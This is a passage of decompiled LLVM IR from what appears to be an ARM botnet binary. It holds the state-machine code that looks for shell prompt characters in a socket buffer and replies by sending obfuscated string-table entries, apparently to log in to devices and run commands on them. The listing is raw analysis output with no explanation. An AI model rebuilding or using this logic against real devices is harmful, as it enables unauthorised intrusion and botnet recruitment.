  %v2_10308 = inttoptr i32 %v1_10308 to i8*
  %v3_10308 = load i8, i8* %v2_10308, align 1
  %v4_10308 = zext i8 %v3_10308 to i32
  store i32 %v4_10308, i32* %r2.global-to-local, align 4
  %v2_1030c = icmp ugt i8 %v3_10308, 61
  store i1 %v2_1030c, i1* %cpsr_c.global-to-local, align 1
  %v7_1030c = icmp eq i8 %v3_10308, 62
  store i1 %v7_1030c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1030c, label %dec_label_pc_10318, label %bb398

bb398:                                            ; preds = %dec_label_pc_10308
  %v3_10310 = icmp ugt i8 %v3_10308, 57
  store i1 %v3_10310, i1* %cpsr_c.global-to-local, align 1
  %v8_10310 = icmp eq i8 %v3_10308, 58
  store i1 %v8_10310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10310, label %dec_label_pc_10318, label %dec_label_pc_102e4

dec_label_pc_10318:                               ; preds = %dec_label_pc_10308, %bb398, %dec_label_pc_102f4, %dec_label_pc_102ec, %dec_label_pc_102e4, %dec_label_pc_102d0, %dec_label_pc_102ac, %dec_label_pc_102c8, %dec_label_pc_102c0, %bb397
  %v0_1031c = phi i32 [ %v1_102a0, %dec_label_pc_102d0 ], [ %v1_102a0, %dec_label_pc_102ac ], [ %v1_102a0, %dec_label_pc_102c8 ], [ %v1_102a0, %dec_label_pc_102c0 ], [ %v1_102a0, %bb397 ], [ %v1_10300, %dec_label_pc_102e4 ], [ %v1_10300, %dec_label_pc_102ec ], [ %v1_10300, %dec_label_pc_102f4 ], [ %v1_10300, %bb398 ], [ %v1_10300, %dec_label_pc_10308 ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_1031c = add i32 %v0_1031c, 1
  store i32 %v1_1031c, i32* @r7, align 4
  %v1_10320 = call i32 @table_unlock_val(i32 24)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10330 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10330, i32* %r0.global-to-local, align 4
  %v3_10334 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10334, i32* %r2.global-to-local, align 4
  store i32 %v3_10330, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10340 = load i32, i32* @r5, align 4
  %v1_10340 = add i32 %v0_10340, 4
  %v2_10340 = inttoptr i32 %v1_10340 to i32*
  %v3_10340 = load i32, i32* %v2_10340, align 4
  store i32 %v3_10340, i32* %r0.global-to-local, align 4
  %v4_10344 = call i32 @__libc_send(i32 %v3_10340, i32 %v3_10330, i32 %v3_10334, i32 16384)
  store i32 %v4_10344, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10354 = load i32, i32* @r5, align 4
  %v1_10354 = add i32 %v0_10354, 4
  %v2_10354 = inttoptr i32 %v1_10354 to i32*
  %v3_10354 = load i32, i32* %v2_10354, align 4
  store i32 %v3_10354, i32* %r0.global-to-local, align 4
  %v4_10358 = call i32 @__libc_send(i32 %v3_10354, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10360 = call i32 @table_lock_val(i32 24)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10368 = load i32, i32* @r5, align 4
  %v2_10368 = add i32 %v1_10368, 12
  %v3_10368 = inttoptr i32 %v2_10368 to i32*
  store i32 8, i32* %v3_10368, align 4
  br label %dec_label_pc_101a0

dec_label_pc_10370:                               ; preds = %dec_label_pc_10080
  %v1_10370 = add i32 %v0_10080, 24
  %v2_10370 = inttoptr i32 %v1_10370 to i32*
  %v3_10370 = load i32, i32* %v2_10370, align 4
  store i32 %v3_10370, i32* %r2.global-to-local, align 4
  %v1_10374 = add i32 %v3_10370, -1
  store i32 %v1_10374, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10378 = icmp eq i32 %v1_10374, 0
  store i1 %v2_10378, i1* %cpsr_z.global-to-local, align 1
  %tmp399 = icmp slt i32 %v1_10374, 1
  br i1 %tmp399, label %dec_label_pc_10004.backedge.thread, label %dec_label_pc_10380

dec_label_pc_10380:                               ; preds = %dec_label_pc_10370
  %v2_10380 = add i32 %v1_10374, %v0_10080
  store i32 %v2_10380, i32* %r3.global-to-local, align 4
  %v1_10384 = add i32 %v2_10380, 28
  %v2_10384 = inttoptr i32 %v1_10384 to i8*
  %v3_10384 = load i8, i8* %v2_10384, align 1
  %v4_10384 = zext i8 %v3_10384 to i32
  store i32 %v4_10384, i32* %r3.global-to-local, align 4
  %v2_10388 = icmp ugt i8 %v3_10384, 61
  store i1 %v2_10388, i1* %cpsr_c.global-to-local, align 1
  %v7_10388 = icmp eq i8 %v3_10384, 62
  store i1 %v7_10388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10388, label %dec_label_pc_103ec, label %bb400

bb400:                                            ; preds = %dec_label_pc_10380
  %v3_1038c = icmp ugt i8 %v3_10384, 57
  store i1 %v3_1038c, i1* %cpsr_c.global-to-local, align 1
  %v8_1038c = icmp eq i8 %v3_10384, 58
  store i1 %v8_1038c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1038c, label %dec_label_pc_103ec, label %dec_label_pc_10394

dec_label_pc_10394:                               ; preds = %bb400
  %v2_10394 = icmp ugt i8 %v3_10384, 35
  store i1 %v2_10394, i1* %cpsr_c.global-to-local, align 1
  %v7_10394 = icmp eq i8 %v3_10384, 36
  store i1 %v7_10394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10394, label %dec_label_pc_103ec, label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_10394
  %v2_1039c = icmp ugt i8 %v3_10384, 34
  store i1 %v2_1039c, i1* %cpsr_c.global-to-local, align 1
  %v7_1039c = icmp eq i8 %v3_10384, 35
  store i1 %v7_1039c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1039c, label %dec_label_pc_103ec, label %dec_label_pc_103a4

dec_label_pc_103a4:                               ; preds = %dec_label_pc_1039c
  %v2_103a4 = icmp ugt i8 %v3_10384, 36
  store i1 %v2_103a4, i1* %cpsr_c.global-to-local, align 1
  %v7_103a4 = icmp eq i8 %v3_10384, 37
  store i1 %v7_103a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103a4, label %dec_label_pc_103ec, label %dec_label_pc_103d4.preheader

dec_label_pc_103d4.preheader:                     ; preds = %dec_label_pc_103a4
  %v3_103a8 = add i32 %v0_10080, 28
  %v2_103ac = add i32 %v3_103a8, %v3_10370
  store i32 %v2_103ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_103d4

dec_label_pc_103b8:                               ; preds = %bb401
  %v2_103b8 = icmp ugt i8 %v3_103dc, 35
  store i1 %v2_103b8, i1* %cpsr_c.global-to-local, align 1
  %v7_103b8 = icmp eq i8 %v3_103dc, 36
  store i1 %v7_103b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103b8, label %dec_label_pc_103ec, label %dec_label_pc_103c0

dec_label_pc_103c0:                               ; preds = %dec_label_pc_103b8
  %v2_103c0 = icmp ugt i8 %v3_103dc, 34
  store i1 %v2_103c0, i1* %cpsr_c.global-to-local, align 1
  %v7_103c0 = icmp eq i8 %v3_103dc, 35
  store i1 %v7_103c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103c0, label %dec_label_pc_103ec, label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103c0
  %v2_103c8 = icmp ugt i8 %v3_103dc, 36
  store i1 %v2_103c8, i1* %cpsr_c.global-to-local, align 1
  %v7_103c8 = icmp eq i8 %v3_103dc, 37
  store i1 %v7_103c8, i1* %cpsr_z.global-to-local, align 1
  %v1_103cc = add i32 %v0_103cc, -1
  store i32 %v1_103cc, i32* %r3.global-to-local, align 4
  br i1 %v7_103c8, label %dec_label_pc_103ec, label %dec_label_pc_103d4

dec_label_pc_103d4:                               ; preds = %dec_label_pc_103d4.preheader, %dec_label_pc_103c8
  %v0_103cc = phi i32 [ %v2_103ac, %dec_label_pc_103d4.preheader ], [ %v1_103cc, %dec_label_pc_103c8 ]
  %v0_103d4 = phi i32 [ %v1_10374, %dec_label_pc_103d4.preheader ], [ %v1_103d4, %dec_label_pc_103c8 ]
  %v1_103d4 = add i32 %v0_103d4, -1
  store i32 %v1_103d4, i32* %r1.global-to-local, align 4
  %v2_103d4 = icmp ne i32 %v0_103d4, 0
  store i1 %v2_103d4, i1* %cpsr_c.global-to-local, align 1
  %v7_103d4 = icmp eq i32 %v0_103d4, 1
  store i1 %v7_103d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103d4, label %dec_label_pc_10004.backedge.thread528, label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103d4
  %v1_103dc = add i32 %v0_103cc, -2
  %v2_103dc = inttoptr i32 %v1_103dc to i8*
  %v3_103dc = load i8, i8* %v2_103dc, align 1
  %v4_103dc = zext i8 %v3_103dc to i32
  store i32 %v4_103dc, i32* %r2.global-to-local, align 4
  %v2_103e0 = icmp ugt i8 %v3_103dc, 61
  store i1 %v2_103e0, i1* %cpsr_c.global-to-local, align 1
  %v7_103e0 = icmp eq i8 %v3_103dc, 62
  store i1 %v7_103e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103e0, label %dec_label_pc_103ec, label %bb401

bb401:                                            ; preds = %dec_label_pc_103dc
  %v3_103e4 = icmp ugt i8 %v3_103dc, 57
  store i1 %v3_103e4, i1* %cpsr_c.global-to-local, align 1
  %v8_103e4 = icmp eq i8 %v3_103dc, 58
  store i1 %v8_103e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_103e4, label %dec_label_pc_103ec, label %dec_label_pc_103b8

dec_label_pc_103ec:                               ; preds = %dec_label_pc_103dc, %bb401, %dec_label_pc_103c8, %dec_label_pc_103c0, %dec_label_pc_103b8, %dec_label_pc_103a4, %dec_label_pc_10380, %dec_label_pc_1039c, %dec_label_pc_10394, %bb400
  %v0_103f0 = phi i32 [ %v1_10374, %dec_label_pc_103a4 ], [ %v1_10374, %dec_label_pc_10380 ], [ %v1_10374, %dec_label_pc_1039c ], [ %v1_10374, %dec_label_pc_10394 ], [ %v1_10374, %bb400 ], [ %v1_103d4, %dec_label_pc_103b8 ], [ %v1_103d4, %dec_label_pc_103c0 ], [ %v1_103d4, %dec_label_pc_103c8 ], [ %v1_103d4, %bb401 ], [ %v1_103d4, %dec_label_pc_103dc ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_103f0 = add i32 %v0_103f0, 1
  store i32 %v1_103f0, i32* @r7, align 4
  %v1_103f4 = call i32 @table_unlock_val(i32 26)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10404 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_10404, i32* %r0.global-to-local, align 4
  %v3_10408 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10408, i32* %r2.global-to-local, align 4
  store i32 %v3_10404, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10414 = load i32, i32* @r5, align 4
  %v1_10414 = add i32 %v0_10414, 4
  %v2_10414 = inttoptr i32 %v1_10414 to i32*
  %v3_10414 = load i32, i32* %v2_10414, align 4
  store i32 %v3_10414, i32* %r0.global-to-local, align 4
  %v4_10418 = call i32 @__libc_send(i32 %v3_10414, i32 %v3_10404, i32 %v3_10408, i32 16384)
  store i32 %v4_10418, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10428 = load i32, i32* @r5, align 4
  %v1_10428 = add i32 %v0_10428, 4
  %v2_10428 = inttoptr i32 %v1_10428 to i32*
  %v3_10428 = load i32, i32* %v2_10428, align 4
  store i32 %v3_10428, i32* %r0.global-to-local, align 4
  %v4_1042c = call i32 @__libc_send(i32 %v3_10428, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10434 = call i32 @table_lock_val(i32 26)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_1043c = load i32, i32* @r5, align 4
  %v2_1043c = add i32 %v1_1043c, 12
  %v3_1043c = inttoptr i32 %v2_1043c to i32*
  store i32 7, i32* %v3_1043c, align 4
  br label %dec_label_pc_101a0

dec_label_pc_10444:                               ; preds = %dec_label_pc_10080
  %v1_10444 = add i32 %v0_10080, 24
  %v2_10444 = inttoptr i32 %v1_10444 to i32*
  %v3_10444 = load i32, i32* %v2_10444, align 4
  store i32 %v3_10444, i32* %r2.global-to-local, align 4
  %v1_10448 = add i32 %v3_10444, -1
  store i32 %v1_10448, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1044c = icmp eq i32 %v1_10448, 0
  store i1 %v2_1044c, i1* %cpsr_z.global-to-local, align 1
  %tmp402 = icmp slt i32 %v1_10448, 1
  br i1 %tmp402, label %dec_label_pc_10004.backedge.thread, label %dec_label_pc_10454

dec_label_pc_10454:                               ; preds = %dec_label_pc_10444
  %v2_10454 = add i32 %v1_10448, %v0_10080
  store i32 %v2_10454, i32* %r3.global-to-local, align 4
  %v1_10458 = add i32 %v2_10454, 28
  %v2_10458 = inttoptr i32 %v1_10458 to i8*
  %v3_10458 = load i8, i8* %v2_10458, align 1
  %v4_10458 = zext i8 %v3_10458 to i32
  store i32 %v4_10458, i32* %r3.global-to-local, align 4
  %v2_1045c = icmp ugt i8 %v3_10458, 61
  store i1 %v2_1045c, i1* %cpsr_c.global-to-local, align 1
  %v7_1045c = icmp eq i8 %v3_10458, 62
  store i1 %v7_1045c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1045c, label %dec_label_pc_104c0, label %bb403

bb403:                                            ; preds = %dec_label_pc_10454
  %v3_10460 = icmp ugt i8 %v3_10458, 57
  store i1 %v3_10460, i1* %cpsr_c.global-to-local, align 1
  %v8_10460 = icmp eq i8 %v3_10458, 58
  store i1 %v8_10460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10460, label %dec_label_pc_104c0, label %dec_label_pc_10468

dec_label_pc_10468:                               ; preds = %bb403
  %v2_10468 = icmp ugt i8 %v3_10458, 35
  store i1 %v2_10468, i1* %cpsr_c.global-to-local, align 1
  %v7_10468 = icmp eq i8 %v3_10458, 36
  store i1 %v7_10468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10468, label %dec_label_pc_104c0, label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %dec_label_pc_10468
  %v2_10470 = icmp ugt i8 %v3_10458, 34
  store i1 %v2_10470, i1* %cpsr_c.global-to-local, align 1
  %v7_10470 = icmp eq i8 %v3_10458, 35
  store i1 %v7_10470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10470, label %dec_label_pc_104c0, label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %dec_label_pc_10470
  %v2_10478 = icmp ugt i8 %v3_10458, 36
  store i1 %v2_10478, i1* %cpsr_c.global-to-local, align 1
  %v7_10478 = icmp eq i8 %v3_10458, 37
  store i1 %v7_10478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10478, label %dec_label_pc_104c0, label %dec_label_pc_104a8.preheader

dec_label_pc_104a8.preheader:                     ; preds = %dec_label_pc_10478
  %v3_1047c = add i32 %v0_10080, 28
  %v2_10480 = add i32 %v3_1047c, %v3_10444
  store i32 %v2_10480, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_104a8

dec_label_pc_1048c:                               ; preds = %bb404
  %v2_1048c = icmp ugt i8 %v3_104b0, 35
  store i1 %v2_1048c, i1* %cpsr_c.global-to-local, align 1
  %v7_1048c = icmp eq i8 %v3_104b0, 36
  store i1 %v7_1048c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1048c, label %dec_label_pc_104c0, label %dec_label_pc_10494

dec_label_pc_10494:                               ; preds = %dec_label_pc_1048c
  %v2_10494 = icmp ugt i8 %v3_104b0, 34
  store i1 %v2_10494, i1* %cpsr_c.global-to-local, align 1
  %v7_10494 = icmp eq i8 %v3_104b0, 35
  store i1 %v7_10494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10494, label %dec_label_pc_104c0, label %dec_label_pc_1049c

dec_label_pc_1049c:                               ; preds = %dec_label_pc_10494
  %v2_1049c = icmp ugt i8 %v3_104b0, 36
  store i1 %v2_1049c, i1* %cpsr_c.global-to-local, align 1
  %v7_1049c = icmp eq i8 %v3_104b0, 37
  store i1 %v7_1049c, i1* %cpsr_z.global-to-local, align 1
  %v1_104a0 = add i32 %v0_104a0, -1
  store i32 %v1_104a0, i32* %r3.global-to-local, align 4
  br i1 %v7_1049c, label %dec_label_pc_104c0, label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %dec_label_pc_104a8.preheader, %dec_label_pc_1049c
  %v0_104a0 = phi i32 [ %v2_10480, %dec_label_pc_104a8.preheader ], [ %v1_104a0, %dec_label_pc_1049c ]
  %v0_104a8 = phi i32 [ %v1_10448, %dec_label_pc_104a8.preheader ], [ %v1_104a8, %dec_label_pc_1049c ]
  %v1_104a8 = add i32 %v0_104a8, -1
  store i32 %v1_104a8, i32* %r1.global-to-local, align 4
  %v2_104a8 = icmp ne i32 %v0_104a8, 0
  store i1 %v2_104a8, i1* %cpsr_c.global-to-local, align 1
  %v7_104a8 = icmp eq i32 %v0_104a8, 1
  store i1 %v7_104a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_104a8, label %dec_label_pc_10004.backedge.thread528, label %dec_label_pc_104b0

dec_label_pc_104b0:                               ; preds = %dec_label_pc_104a8
  %v1_104b0 = add i32 %v0_104a0, -2
  %v2_104b0 = inttoptr i32 %v1_104b0 to i8*
  %v3_104b0 = load i8, i8* %v2_104b0, align 1
  %v4_104b0 = zext i8 %v3_104b0 to i32
  store i32 %v4_104b0, i32* %r2.global-to-local, align 4
  %v2_104b4 = icmp ugt i8 %v3_104b0, 61
  store i1 %v2_104b4, i1* %cpsr_c.global-to-local, align 1
  %v7_104b4 = icmp eq i8 %v3_104b0, 62
  store i1 %v7_104b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_104b4, label %dec_label_pc_104c0, label %bb404

bb404:                                            ; preds = %dec_label_pc_104b0
  %v3_104b8 = icmp ugt i8 %v3_104b0, 57
  store i1 %v3_104b8, i1* %cpsr_c.global-to-local, align 1
  %v8_104b8 = icmp eq i8 %v3_104b0, 58
  store i1 %v8_104b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_104b8, label %dec_label_pc_104c0, label %dec_label_pc_1048c

dec_label_pc_104c0:                               ; preds = %dec_label_pc_104b0, %bb404, %dec_label_pc_1049c, %dec_label_pc_10494, %dec_label_pc_1048c, %dec_label_pc_10478, %dec_label_pc_10454, %dec_label_pc_10470, %dec_label_pc_10468, %bb403
  %v0_104c4 = phi i32 [ %v1_10448, %dec_label_pc_10478 ], [ %v1_10448, %dec_label_pc_10454 ], [ %v1_10448, %dec_label_pc_10470 ], [ %v1_10448, %dec_label_pc_10468 ], [ %v1_10448, %bb403 ], [ %v1_104a8, %dec_label_pc_1048c ], [ %v1_104a8, %dec_label_pc_10494 ], [ %v1_104a8, %dec_label_pc_1049c ], [ %v1_104a8, %bb404 ], [ %v1_104a8, %dec_label_pc_104b0 ]
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_104c4 = add i32 %v0_104c4, 1
  store i32 %v1_104c4, i32* @r7, align 4
  %v1_104c8 = call i32 @table_unlock_val(i32 27)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_104d8 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  store i32 %v3_104d8, i32* %r0.global-to-local, align 4
  %v3_104dc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_104dc, i32* %r2.global-to-local, align 4
  store i32 %v3_104d8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_104e8 = load i32, i32* @r5, align 4
  %v1_104e8 = add i32 %v0_104e8, 4
  %v2_104e8 = inttoptr i32 %v1_104e8 to i32*
  %v3_104e8 = load i32, i32* %v2_104e8, align 4
  store i32 %v3_104e8, i32* %r0.global-to-local, align 4
  %v4_104ec = call i32 @__libc_send(i32 %v3_104e8, i32 %v3_104d8, i32 %v3_104dc, i32 16384)
  store i32 %v4_104ec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_104fc = load i32, i32* @r5, align 4
  %v1_104fc = add i32 %v0_104fc, 4
  %v2_104fc = inttoptr i32 %v1_104fc to i32*
  %v3_104fc = load i32, i32* %v2_104fc, align 4
  store i32 %v3_104fc, i32* %r0.global-to-local, align 4
  %v4_10500 = call i32 @__libc_send(i32 %v3_104fc, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10508 = call i32 @table_lock_val(i32 27)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_10510 = load i32, i32* @r5, align 4
  %v2_10510 = add i32 %v1_10510, 12
  %v3_10510 = inttoptr i32 %v2_10510 to i32*
  store i32 9, i32* %v3_10510, align 4
  br label %dec_label_pc_101a0

dec_label_pc_10518:                               ; preds = %dec_label_pc_10080
  %v1_10518 = add i32 %v0_10080, 24
  %v2_10518 = inttoptr i32 %v1_10518 to i32*
  %v3_10518 = load i32, i32* %v2_10518, align 4
  store i32 %v3_10518, i32* %r2.global-to-local, align 4
  %v1_1051c = add i32 %v3_10518, -1
  store i32 %v1_1051c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10520 = icmp eq i32 %v1_1051c, 0
  store i1 %v2_10520, i1* %cpsr_z.global-to-local, align 1
  %tmp405 = icmp slt i32 %v1_1051c, 1
  br i1 %tmp405, label %dec_label_pc_10004.backedge.thread, label %dec_label_pc_10528

dec_label_pc_10528:                               ; preds = %dec_label_pc_10518
  %v2_10528 = add i32 %v1_1051c, %v0_10080
  store i32 %v2_10528, i32* %r3.global-to-local, align 4
  %v1_1052c = add i32 %v2_10528, 28
  %v2_1052c = inttoptr i32 %v1_1052c to i8*
  %v3_1052c = load i8, i8* %v2_1052c, align 1
  %v4_1052c = zext i8 %v3_1052c to i32
  store i32 %v4_1052c, i32* %r3.global-to-local, align 4
  %v2_10530 = icmp ugt i8 %v3_1052c, 61
  store i1 %v2_10530, i1* %cpsr_c.global-to-local, align 1
  %v7_10530 = icmp eq i8 %v3_1052c, 62
  store i1 %v7_10530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10530, label %dec_label_pc_10654, label %bb406

bb406:                                            ; preds = %dec_label_pc_10528
  %v3_10534 = icmp ugt i8 %v3_1052c, 57
  store i1 %v3_10534, i1* %cpsr_c.global-to-local, align 1
  %v8_10534 = icmp eq i8 %v3_1052c, 58
  store i1 %v8_10534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10534, label %dec_label_pc_10654, label %dec_label_pc_1053c

dec_label_pc_1053c:                               ; preds = %bb406
  %v2_1053c = icmp ugt i8 %v3_1052c, 35
  store i1 %v2_1053c, i1* %cpsr_c.global-to-local, align 1
  %v7_1053c = icmp eq i8 %v3_1052c, 36
  store i1 %v7_1053c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1053c, label %dec_label_pc_10654, label %dec_label_pc_10544

dec_label_pc_10544:                               ; preds = %dec_label_pc_1053c
  %v2_10544 = icmp ugt i8 %v3_1052c, 34
  store i1 %v2_10544, i1* %cpsr_c.global-to-local, align 1
  %v7_10544 = icmp eq i8 %v3_1052c, 35
  store i1 %v7_10544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10544, label %dec_label_pc_10654, label %dec_label_pc_1054c

dec_label_pc_1054c:                               ; preds = %dec_label_pc_10544
  %v2_1054c = icmp ugt i8 %v3_1052c, 36
  store i1 %v2_1054c, i1* %cpsr_c.global-to-local, align 1
  %v7_1054c = icmp eq i8 %v3_1052c, 37
  store i1 %v7_1054c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1054c, label %dec_label_pc_10654, label %dec_label_pc_1063c.preheader

dec_label_pc_1063c.preheader:                     ; preds = %dec_label_pc_1054c
  %v3_10550 = add i32 %v0_10080, 28
  %v2_10554 = add i32 %v3_10550, %v3_10518
  store i32 %v2_10554, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1063c

dec_label_pc_10620:                               ; preds = %bb407
  %v2_10620 = icmp ugt i8 %v3_10644, 35
  store i1 %v2_10620, i1* %cpsr_c.global-to-local, align 1
  %v7_10620 = icmp eq i8 %v3_10644, 36
  store i1 %v7_10620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10620, label %dec_label_pc_10654, label %dec_label_pc_10628

dec_label_pc_10628:                               ; preds = %dec_label_pc_10620
  %v2_10628 = icmp ugt i8 %v3_10644, 34
  store i1 %v2_10628, i1* %cpsr_c.global-to-local, align 1
  %v7_10628 = icmp eq i8 %v3_10644, 35
  store i1 %v7_10628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10628, label %dec_label_pc_10654, label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %dec_label_pc_10628
  %v2_10630 = icmp ugt i8 %v3_10644, 36
  store i1 %v2_10630, i1* %cpsr_c.global-to-local, align 1
  %v7_10630 = icmp eq i8 %v3_10644, 37
  store i1 %v7_10630, i1* %cpsr_z.global-to-local, align 1
  %v1_10634 = add i32 %v0_10634, -1
  store i32 %v1_10634, i32* %r3.global-to-local, align 4
  br i1 %v7_10630, label %dec_label_pc_10654, label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_1063c.preheader, %dec_label_pc_10630
  %v0_10634 = phi i32 [ %v2_10554, %dec_label_pc_1063c.preheader ], [ %v1_10634, %dec_label_pc_10630 ]
  %v0_1063c = phi i32 [ %v1_1051c, %dec_label_pc_1063c.preheader ], [ %v1_1063c, %dec_label_pc_10630 ]
  %v1_1063c = add i32 %v0_1063c, -1
  store i32 %v1_1063c, i32* %r1.global-to-local, align 4
  %v2_1063c = icmp ne i32 %v0_1063c, 0
  store i1 %v2_1063c, i1* %cpsr_c.global-to-local, align 1
  %v7_1063c = icmp eq i32 %v0_1063c, 1
  store i1 %v7_1063c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1063c, label %dec_label_pc_10004.backedge.thread528, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_1063c
  %v1_10644 = add i32 %v0_10634, -2
  %v2_10644 = inttoptr i32 %v1_10644 to i8*
  %v3_10644 = load i8, i8* %v2_10644, align 1
  %v4_10644 = zext i8 %v3_10644 to i32
  store i32 %v4_10644, i32* %r2.global-to-local, align 4
  %v2_10648 = icmp ugt i8 %v3_10644, 61
  store i1 %v2_10648, i1* %cpsr_c.global-to-local, align 1
  %v7_10648 = icmp eq i8 %v3_10644, 62
  store i1 %v7_10648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10648, label %dec_label_pc_10654, label %bb407

bb407:                                            ; preds = %dec_label_pc_10644
  %v3_1064c = icmp ugt i8 %v3_10644, 57
  store i1 %v3_1064c, i1* %cpsr_c.global-to-local, align 1
  %v8_1064c = icmp eq i8 %v3_10644, 58
  store i1 %v8_1064c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1064c, label %dec_label_pc_10654, label %dec_label_pc_10620

dec_label_pc_10654:                               ; preds = %dec_label_pc_10644, %bb407, %dec_label_pc_10630, %dec_label_pc_10628, %dec_label_pc_10620, %dec_label_pc_1054c, %dec_label_pc_10528, %dec_label_pc_10544, %dec_label_pc_1053c, %bb406
  %v0_10658 = phi i32 [ %v1_1051c, %dec_label_pc_1054c ], [ %v1_1051c, %dec_label_pc_10528 ], [ %v1_1051c, %dec_label_pc_10544 ], [ %v1_1051c, %dec_label_pc_1053c ], [ %v1_1051c, %bb406 ], [ %v1_1063c, %dec_label_pc_10620 ], [ %v1_1063c, %dec_label_pc_10628 ], [ %v1_1063c, %dec_label_pc_10630 ], [ %v1_1063c, %bb407 ], [ %v1_1063c, %dec_label_pc_10644 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10658 = add i32 %v0_10658, 1
  store i32 %v1_10658, i32* @r7, align 4
  %v1_1065c = call i32 @table_unlock_val(i32 25)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_1066c = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_1066c, i32* %r0.global-to-local, align 4
  %v3_10670 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10670, i32* %r2.global-to-local, align 4
  store i32 %v3_1066c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
